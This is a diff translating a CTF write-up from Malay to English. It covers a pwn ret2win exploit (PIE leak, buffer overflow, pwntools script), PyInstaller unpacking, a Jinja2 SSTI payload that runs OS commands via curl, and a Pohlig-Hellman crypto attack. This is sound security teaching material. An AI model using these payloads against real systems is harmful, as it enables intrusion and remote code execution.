@@ -7,10 +7,10 @@ author: Mohamad Helmi
 description: "EqualsCTF challenges write-up"
 ---
 # Intro
-Joined EQCTF untuk vibe dan jalan-jalan di APU🙂.
+Come for the vibe and jalan-jalan at APU🙂
 
 ## dogwalker (Pwn)
-Binary `dogwalker` adalah ELF 64-bit PIE, server boleh disambung melalui `nc 135.181.88.229 20003`.
+The binary `dogwalker` is a 64-bit PIE ELF, reachable via `nc 135.181.88.229 20003`.
 
 ### Enumeration
 ```
@@ -25,38 +25,38 @@ NX:         NX enabled
 PIE:        PIE enabled
 ```
 
-Protections aktif:
-- **PIE** — base address diacak setiap run (ASLR)
-- **NX** — stack tidak executable
-- **Tiada stack canary** — buffer overflow boleh langsung overwrite return address
+Protections active:
+- **PIE** — base address randomized on every run (ASLR)
+- **NX** — stack is not executable
+- **No stack canary** — a buffer overflow can directly overwrite the return address
 
-Disassembly mendedahkan 4 fungsi utama (offset dari base):
+Disassembly reveals 4 key functions (offset from base):
 
-| Fungsi | Offset | Keterangan |
+| Function | Offset | Description |
 |---|---|---|
-| `win()` | `0x11a9` | Buka `flag.txt`, print flag |
-| `bark()` | `0x12e1` | Print "woof woof!" |
+| `win()` | `0x11a9` | Opens `flag.txt`, prints the flag |
+| `bark()` | `0x12e1` | Prints "woof woof!" |
 | `groom()` | `0x12f7` | **VULNERABLE** — buffer overflow |
-| `main()` | `0x1345` | Print PIE leak, routing ke menu |
+| `main()` | `0x1345` | Prints the PIE leak, routes to the menu |
 
 ### Analysis
-**PIE Leak (ASLR Bypass).** `main()` print alamat fungsi `bark()` secara terus:
+**PIE Leak (ASLR Bypass).** `main()` prints the address of `bark()` directly:
 
 ```c
 printf("whistle: %p\n", &bark);
 ```
 
-Output contoh:
+Sample output:
 ```
 whistle: 0x608440c142e1
 ```
 
-Base address binary boleh dikira:
+The binary's base address can be computed:
 ```python
 base = leaked_bark_addr - 0x12e1
 ```
 
-**Buffer Overflow dalam `groom()`.**
+**Buffer Overflow in `groom()`.**
 
 ```c
 // groom() — stack layout:
@@ -64,19 +64,19 @@ base = leaked_bark_addr - 0x12e1
 // rbp+0x00  = saved rbp (8 bytes)
 // rbp+0x08  = return address
 
-read(0, rbp-0x50, 0xc8);  // baca 200 bytes ke dalam 80-byte buffer!
+read(0, rbp-0x50, 0xc8);  // reads 200 bytes into an 80-byte buffer!
 ```
 
-Overflow: **200 - 80 = 120 bytes** boleh overwrite ke luar buffer. Return address ada pada **offset 88** dari awal buffer (`0x50 + 0x8`).
+Overflow: **200 - 80 = 120 bytes** can write past the buffer. The return address sits at **offset 88** from the start of the buffer (`0x50 + 0x8`).
 
 ### Exploitation
-Strategi serangan:
+Attack strategy:
 
-1. Receive output `whistle: <addr>` → kira `base`
-2. Hantar `'1'` → masuk `groom()`
-3. Hantar payload overflow: `[ 'A' * 88 ] [ ret gadget ] [ win() address ]`
+1. Receive the `whistle: <addr>` output → compute `base`
+2. Send `'1'` → enter `groom()`
+3. Send the overflow payload: `[ 'A' * 88 ] [ ret gadget ] [ win() address ]`
 
-`ret` gadget diperlukan untuk **16-byte stack alignment** sebelum `win()` dipanggil (SSE requirement dalam x86-64). Ditemui pada offset `0x1016` via `objdump`:
+The `ret` gadget is needed for **16-byte stack alignment** before `win()` is called (an SSE requirement on x86-64). Found at offset `0x1016` via `objdump`:
 ```
 1016: c3   ret
 ```
@@ -92,7 +92,7 @@ context.binary = elf
 
 io = remote(HOST, PORT)
 
-# Step 1: Terima PIE leak
+# Step 1: Receive the PIE leak
 io.recvuntil(b"whistle: ")
 leak = int(io.recvline().strip(), 16)
 base = leak - 0x12e1
@@ -101,11 +101,11 @@ log.info(f"base: {hex(base)}")
 win_addr   = base + 0x11a9
 ret_gadget = base + 0x1016
 
-# Step 2: Pilih menu '1' → groom()
+# Step 2: Pick menu option '1' → groom()
 io.recvuntil(b"2) Bark and leave\n")
 io.sendline(b"1")
 
-# Step 3: Hantar overflow payload
+# Step 3: Send the overflow payload
 io.recvuntil(b"Collar name:")
 payload  = b"A" * 88          # padding
 payload += p64(ret_gadget)    # stack alignment
@@ -128,12 +128,12 @@ EQCTF{1_4M_Pwn_M4sT3r_w0oF_wo0f}
 ```
 
 ### Key Takeaways
-Tanpa stack canary, satu PIE leak je dah cukup untuk hitung semua alamat yang diperlukan untuk ret2win. Kena ingat juga pasal 16-byte stack alignment kalau target function guna SSE instructions — kalau tak, `win()` akan crash sebelum sampai `read()`.
+Without a stack canary, a single PIE leak is all it takes to compute every address needed for a ret2win. Also worth remembering: 16-byte stack alignment matters when the target function uses SSE instructions — get it wrong and `win()` crashes before you even see the output.
 
 ---
 
 ## doggy (Reverse Engineering)
-Binary `doggy-flag-checker` adalah ELF 64-bit, stripped.
+The binary `doggy-flag-checker` is a stripped 64-bit ELF.
 
 ### Enumeration
 ```
@@ -144,7 +144,7 @@ $ ls -lh doggy-flag-checker
 -rwxrwxr-x 1 kali kali 8.6M Jun 20 ...
 ```
 
-Saiz 8.6 MB adalah sangat besar untuk binary biasa. `strings` mendedahkan:
+8.6 MB is unusually large for a simple binary. `strings` reveals:
 
 ```
 PyRun_SimpleStringFlags
@@ -153,10 +153,10 @@ pyi-python-flag
 libpython3.10.so.1.0
 ```
 
-**Kesimpulan: Binary ini adalah PyInstaller bundle** — Python 3.10 script yang dikompil dan dipack ke dalam satu ELF executable. Logik sebenar ada dalam embedded Python bytecode.
+**Conclusion: this binary is a PyInstaller bundle** — a Python 3.10 script compiled and packed into a single ELF executable. The real logic lives in the embedded Python bytecode.
 
 ### Analysis
-**Step 1: Ekstrak PyInstaller Bundle**
+**Step 1: Extract the PyInstaller bundle**
 
 ```bash
 python3 pyinstxtractor.py doggy-flag-checker
@@ -175,16 +175,16 @@ Output:
 
 Entry point: `challenge.pyc`
 
-**Step 2: Decompile Bytecode**
+**Step 2: Decompile the bytecode**
 
-Host Python (3.13) tidak boleh load bytecode Python 3.10 secara langsung. Guna `xdis` dalam virtualenv:
+The host Python (3.13) can't load Python 3.10 bytecode directly. Use `xdis` inside a virtualenv:
 
 ```bash
 python3 -m venv /tmp/venv310
 source /tmp/venv310/bin/activate
 pip install xdis
 
-# Jalankan dari /tmp untuk elak conflict dengan struct.pyc yang diekstrak
+# Run from /tmp to avoid conflicting with the extracted struct.pyc
 python3 -c "
 import xdis
 import marshal, sys
@@ -197,14 +197,14 @@ print(code.co_names)
 "
 ```
 
-**Step 3: Reverse Validation Logic**
+**Step 3: Reverse the validation logic**
 
-Dari bytecode, logik check flag adalah:
+From the bytecode, the flag check turns out to be:
 
 ```python
 _k = (137, 64, 129, 97, ...)    # XOR key (4 bytes, cycling)
-_p = (26, 32, 18, 17, ...)      # Permutation array (34 elemen)
-_t = (162, 127, 177, 9, ...)    # Target bytes (34 elemen)
+_p = (26, 32, 18, 17, ...)      # permutation array (34 elements)
+_t = (162, 127, 177, 9, ...)    # target bytes (34 elements)
 
 def check_flag(flag):
     if len(flag) != 34:
@@ -215,16 +215,16 @@ def check_flag(flag):
 ```
 
 ### Exploitation
-Untuk inverse logik di atas:
+To invert the above:
 
-1. `_p` adalah permutation of `0..33` → ia mempunyai inverse yang unik
-2. Untuk setiap posisi `j`: `shuffled[j] = chr(_t[j] ^ _k[j % 4])`
-3. Kemudian: `flag[_p[j]] = shuffled[j]`
+1. `_p` is a permutation of `0..33` → it has a unique inverse
+2. For each position `j`: `shuffled[j] = chr(_t[j] ^ _k[j % 4])`
+3. Then: `flag[_p[j]] = shuffled[j]`
 
 ```python
 _k = (137, 64, 129, 97)          # XOR key
-_p = [26, 32, 18, 17, ...]       # permutation (34 elemen)
-_t = [162, 127, 177, 9, ...]     # target (34 elemen)
+_p = [26, 32, 18, 17, ...]       # permutation (34 elements)
+_t = [162, 127, 177, 9, ...]     # target (34 elements)
 
 flag = ['?'] * 34
 for j in range(34):
@@ -240,7 +240,7 @@ $ echo 'EQCTF{+his_is_py+h0n_3x3cu+4bl3??}' | ./doggy-flag-checker
 flag: correct!
 ```
 
-> `+` dalam flag adalah leetspeak untuk huruf `t` (iaitu "this" dan "python" dan "executable")
+> The `+` in the flag is leetspeak for the letter `t` (as in "this", "python", and "executable")
 
 ### Flag
 ```
@@ -248,17 +248,17 @@ EQCTF{+his_is_py+h0n_3x3cu+4bl3??}
 ```
 
 ### Key Takeaways
-Saiz binary yang luar biasa besar (8.6 MB untuk satu flag checker) adalah signal kuat untuk PyInstaller bundle. Sebaik diekstrak, validation logic dalam bytecode boleh dianalisis terus tanpa perlu disassemble assembly x86 langsung — buang masa kalau cuba reverse `_start` punya stub C wrapper, sebab logik sebenar ada dalam `.pyc`.
+An unusually large binary (8.6 MB for a single flag checker) is a strong signal of a PyInstaller bundle. Once extracted, the validation logic in the bytecode can be analyzed directly without ever touching raw x86 disassembly — trying to reverse the `_start` C wrapper stub is a waste of time, since the real logic lives in the `.pyc`.
 
 ---
 
 ## Web badge generator (Server-Side Template Injection)
-Target: `http://f760369e-d944-46a0-a644-95ff400249da.chal.1v1.eqctf.com/`, stack Python 3.12 + Flask + Jinja2.
+Target: `http://f760369e-d944-46a0-a644-95ff400249da.chal.1v1.eqctf.com/`, stack is Python 3.12 + Flask + Jinja2.
 
 ### Enumeration
-Source code diberikan dalam direktori `dist/`. Fail utama: `app.py`. Route `/generate` menerima tiga field dari form POST: `name` (max 120 chars), `department`, `employee_id`.
+Source code was provided in the `dist/` directory. Main file: `app.py`. The `/generate` route accepts three POST form fields: `name` (max 120 chars), `department`, `employee_id`.
 
-Kod yang vulnerable:
+The vulnerable code:
 
 ```python
 @app.route("/generate", methods=["POST"])
@@ -267,7 +267,7 @@ def generate():
     department = request.form.get("department", "Web").strip() or "Web"
     employee_id = request.form.get("employee_id", "").strip()
 
-    # Vulnerable: user input diinterpolate terus ke dalam template string
+    # Vulnerable: user input is interpolated directly into the template string
     badge_template = f"""
     <div class="badge-card">
         ...
@@ -282,31 +282,31 @@ def generate():
 ```
 
 ### Analysis
-Punca masalah: input pengguna dimasukkan terus ke dalam f-string Python, kemudian string tersebut dihantar ke `jinja_env.from_string().render()` untuk di-render sebagai Jinja2 template.
+The root cause: user input is dropped straight into a Python f-string, and that string is then handed to `jinja_env.from_string().render()` to be rendered as a Jinja2 template.
 
-Ini bermaksud jika input mengandungi sintaks Jinja2 seperti `{{ ... }}`, ia akan **dilaksanakan oleh template engine** di server.
+That means any input containing Jinja2 syntax like `{{ ... }}` gets **executed by the template engine** on the server.
 
-Aliran data:
+Data flow:
 ```
 user input → f-string interpolation → Jinja2 from_string() → render() → RCE
 ```
 
-Field `department` dan `employee_id` tiada had panjang, menjadikannya sasaran ideal untuk payload yang lebih panjang.
+The `department` and `employee_id` fields have no length limit, making them ideal targets for a longer payload.
 
 ### Exploitation
-Jinja2 SSTI membenarkan akses kepada Python object hierarchy. Payload untuk execute OS command:
+Jinja2 SSTI grants access to the Python object hierarchy. Payload to execute an OS command:
 
 ```
 {{config.__class__.__init__.__globals__['os'].popen('cat /app/flag.txt').read()}}
 ```
 
-Penjelasan payload:
-1. `config` — objek Flask config yang sedia ada dalam Jinja2 context
-2. `.__class__.__init__.__globals__` — akses ke global namespace Python melalui object hierarchy
-3. `['os']` — dapatkan modul `os` dari namespace
-4. `.popen('cat /app/flag.txt').read()` — jalankan shell command dan baca output
+Payload breakdown:
+1. `config` — a Flask config object already present in the Jinja2 context
+2. `.__class__.__init__.__globals__` — reaches the Python global namespace through the object hierarchy
+3. `['os']` — grabs the `os` module from that namespace
+4. `.popen('cat /app/flag.txt').read()` — runs the shell command and reads the output
 
-Payload dihantar melalui field `department`:
+The payload is sent through the `department` field:
 
 ```bash
 curl -X POST "http://<target>/generate" \
@@ -315,7 +315,7 @@ curl -X POST "http://<target>/generate" \
   --data-urlencode "employee_id=1"
 ```
 
-Server render payload sebagai Jinja2 expression dan output flag terus dalam HTML badge:
+The server renders the payload as a Jinja2 expression and the flag comes straight back in the HTML badge:
 
 ```html
 <p class="badge-dept">EQCTF{SST1_1s_F0r_Th3_We4kl1ngs_GG3z}</p>
@@ -327,22 +327,22 @@ EQCTF{SST1_1s_F0r_Th3_We4kl1ngs_GG3z}
 ```
 
 ### Key Takeaways
-Jangan sekali-kali bina template string dengan f-string yang ada user input sebelum dihantar ke `jinja_env.from_string()`. Fix yang betul guna `render_template()` dengan context variables berasingan:
+Never build a template string with an f-string containing user input before handing it to `jinja_env.from_string()`. The correct fix is `render_template()` with separate context variables:
 
 ```python
-# SELAMAT — gunakan template file dengan context variables
+# SAFE — use a template file with context variables
 return render_template("badge.html", name=name, department=department)
 ```
 
-Kalau perlu render dynamic template, sanitize/escape input terlebih dahulu dan jangan sekali-kali interpolate raw user input ke dalam string yang akan di-render oleh template engine.
+If a dynamic template is genuinely needed, sanitize/escape the input first, and never interpolate raw user input into a string that will later be rendered by the template engine.
 
 ---
 
 ## QR (Crypto)
-Files diberikan: `challenge.py`, `encrypted_flag.dat` (51 bytes).
+Files provided: `challenge.py`, `encrypted_flag.dat` (51 bytes).
 
 ### Enumeration
-Source code `challenge.py` mendedahkan custom cipher dengan parameter berikut:
+The source `challenge.py` reveals a custom cipher with the following parameters:
 
 ```python
 P  = 0x964b061f035604101d58d216b74546699   # ~129-bit prime modulus
@@ -351,10 +351,10 @@ a  = 0xb56a3be5dba5d16f78ce1db74cf535f0
 b  = 0xd18594a9023bced7e42a4694620a253a
 c  = 0x913edcf2828cca16c93ecc87215995a0
 IV = 0xc6ed7e913d0bfac20fe6d01607871b8c
-# d <= 500  ← satu-satunya unknown parameter
+# d <= 500  ← the only unknown parameter
 ```
 
-Proses enkripsi setiap block:
+The encryption process for each block:
 
 ```python
 prev_c = IV
@@ -369,20 +369,20 @@ for i in range(0, len(payload), 16):
     prev_c = C
 ```
 
-Ciphertext `encrypted_flag.dat` mengandungi **3 block × 17 bytes = 51 bytes** jumlah, bermakna 48 bytes plaintext.
+`encrypted_flag.dat` is **3 blocks × 17 bytes = 51 bytes** total, meaning 48 bytes of plaintext.
 
 ### Analysis
-Dua kelemahan ditemui:
+Two weaknesses stand out:
 
-**1. Parameter `d` sangat kecil (`d <= 500`)** — hanya 501 nilai yang mungkin, membolehkan brute-force.
+**1. Parameter `d` is very small (`d <= 500`)** — only 501 possible values, which makes brute-forcing it feasible.
 
-**2. `P-1` adalah B-smooth (largest prime factor = 67)** — factoring `P-1` mendedahkan ia mempunyai faktor-faktor yang sangat kecil:
+**2. `P-1` is B-smooth (largest prime factor = 67)** — factoring `P-1` reveals it's made up entirely of small factors:
 
 ```
-P - 1 = 2^k * 3^j * 5^i * ... * 67^m   (semua faktor prima ≤ 67)
+P - 1 = 2^k * 3^j * 5^i * ... * 67^m   (all prime factors ≤ 67)
 ```
 
-Ini bermakna **Pohlig-Hellman** boleh menyelesaikan discrete logarithm dalam kumpulan Zp* dengan serta-merta, walaupun P adalah 129-bit.
+That means **Pohlig-Hellman** can solve the discrete logarithm in the group Zp* almost instantly, even though P is 129 bits.
 
 ### Exploitation
 **Step 1: Factor P-1**
@@ -391,10 +391,10 @@ Ini bermakna **Pohlig-Hellman** boleh menyelesaikan discrete logarithm dalam kum
 from sympy import factorint
 P = 0x964b061f035604101d58d216b74546699
 print(factorint(P - 1))
-# → semua faktor prima ≤ 67 (B-smooth)
+# → all prime factors ≤ 67 (B-smooth)
 ```
 
-**Step 2: Brute-force `d` (0 hingga 500)**
+**Step 2: Brute-force `d` (0 through 500)**
 
 ```python
 from sympy.ntheory.residue_ntheory import discrete_log
@@ -419,9 +419,9 @@ for d in range(501):
         break
 ```
 
-Hasil: **d = 321**, block 0 = `fQxBSXTMmFXvu0Tg` (16-byte random prefix — bukan literal `<somedata>`).
+Result: **d = 321**, block 0 = `fQxBSXTMmFXvu0Tg` (a 16-byte random prefix — not the literal `<somedata>`).
 
-**Step 3: Decrypt semua blocks**
+**Step 3: Decrypt all blocks**
 
 ```python
 d = 321
@@ -445,12 +445,12 @@ Output:
 b'fQxBSXTMmFXvu0TgEQCTF{t4rp1t_qr_c0d3_m4dn3ss}\x00\x00'
 ```
 
-Plaintext penuh:
-- **16 bytes random prefix**: `fQxBSXTMmFXvu0Tg` (ini yang disembunyikan sebagai `<somedata>` dalam comment)
+Full plaintext:
+- **16-byte random prefix**: `fQxBSXTMmFXvu0Tg` (this is what's disguised as `<somedata>` in the comment)
 - **Flag**: `EQCTF{t4rp1t_qr_c0d3_m4dn3ss}`
 - **Padding**: null bytes
 
-> **Note:** `b"<somedata>"` dalam source comment adalah placeholder sahaja — prefix sebenar adalah 16 bytes rawak, bukan literal string tersebut. Ini adalah decoy untuk menghalang serangan known-plaintext mudah.
+> **Note:** the `b"<somedata>"` in the source comment is just a placeholder — the real prefix is 16 random bytes, not that literal string. It's a decoy meant to block a simple known-plaintext attack.
 
 ### Flag
 ```
@@ -458,4 +458,4 @@ EQCTF{t4rp1t_qr_c0d3_m4dn3ss}
 ```
 
 ### Key Takeaways
-Modulus 129-bit nampak selamat di permukaan, tapi kalau `P-1` boleh difactor kepada faktor-faktor kecil (B-smooth), Pohlig-Hellman boleh selesaikan discrete log dalam masa yang singkat — tak kira berapa besar pun P. Parameter `d` yang dibatasi kecil (`<= 500`) menambah lubang kedua yang boleh terus di-brute-force selepas DLP diselesaikan untuk setiap kemungkinan.
+A 129-bit modulus looks safe on the surface, but if `P-1` factors into small pieces (B-smooth), Pohlig-Hellman solves the discrete log quickly regardless of how big P is. The artificially small `d` (`<= 500`) adds a second hole that's trivially brute-forceable once the DLP is solved for each candidate.
